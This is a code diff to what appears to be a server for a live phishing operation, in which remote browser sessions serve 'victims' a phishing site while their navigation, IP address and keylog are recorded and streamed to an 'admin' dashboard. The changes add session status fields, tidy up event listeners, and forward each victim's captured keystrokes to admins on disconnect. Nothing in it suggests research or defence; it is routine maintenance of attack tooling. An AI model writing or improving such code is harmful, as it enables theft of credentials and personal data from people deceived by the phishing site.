@@ -138,6 +138,7 @@ function handleAdminConnect(
       connectedAt: i.connectedAt?.toISOString() ?? '',
       ip: '', // IP is logged but not sent to admin UI (privacy consideration)
       keylog: i.keylog,
+      status: 'active' as const,
     }));
   socket.emit('victim_list', victims);
 
@@ -449,10 +450,11 @@ function handleVictimConnect(
        * Log every top-level navigation URL.
        * Helps track victim's journey through the phishing site.
        */
-      instance.page.on('framenavigated', (frame) => {
+      instance.navigationLogger = (frame) => {
         if (frame.parentFrame() !== null) return; // Only log main frame
         void logEvent({ event: 'navigation', browserId: instance.id, url: frame.url() });
-      });
+      };
+      instance.page.on('framenavigated', instance.navigationLogger);
 
       /**
        * Emit page title + favicon to victim after each navigation.
@@ -476,10 +478,11 @@ function handleVictimConnect(
       };
 
       // Emit page metadata after each navigation
-      instance.page.on('framenavigated', (frame) => {
+      instance.pageMetaEmitter = (frame) => {
         if (frame.parentFrame() !== null) return; // Only for main frame
         void emitPageMeta();
-      });
+      };
+      instance.page.on('framenavigated', instance.pageMetaEmitter);
 
       // Emit initial page metadata
       void emitPageMeta();
@@ -491,6 +494,7 @@ function handleVictimConnect(
         connectedAt: instance.connectedAt?.toISOString() ?? '',
         ip: socket.handshake.address,
         keylog: '',
+        status: 'active',
       };
       io.to('admin').emit('new_victim', victimInfo);
     } catch (err) {
@@ -667,11 +671,31 @@ async function handleDisconnect(io: IoServer, socket: AppSocket): Promise<void> 
   const browserId = socket.data.browserId;
   if (browserId) {
     const instance = getInstanceById(browserId);
+    
+    // Remove event listeners before closing browser
+    if (instance) {
+      if (instance.navigationLogger) {
+        instance.page.off('framenavigated', instance.navigationLogger);
+        instance.navigationLogger = null;
+      }
+      if (instance.pageMetaEmitter) {
+        instance.page.off('framenavigated', instance.pageMetaEmitter);
+        instance.pageMetaEmitter = null;
+      }
+    }
+    
     const durationMs = instance?.connectedAt
       ? Date.now() - instance.connectedAt.getTime()
       : 0;
     void logEvent({ event: 'session_end', browserId, durationMs });
-    io.to('admin').emit('victim_disconnected', { browserId });
+    
+    // Notify admins of status change (keep session visible but mark as disconnected)
+    io.to('admin').emit('victim_disconnected', { 
+      browserId,
+      status: 'disconnected',
+      keylog: instance?.keylog ?? '',
+    });
+    
     clearVictimMetrics(browserId);
     await closeBrowser(browserId);
   }
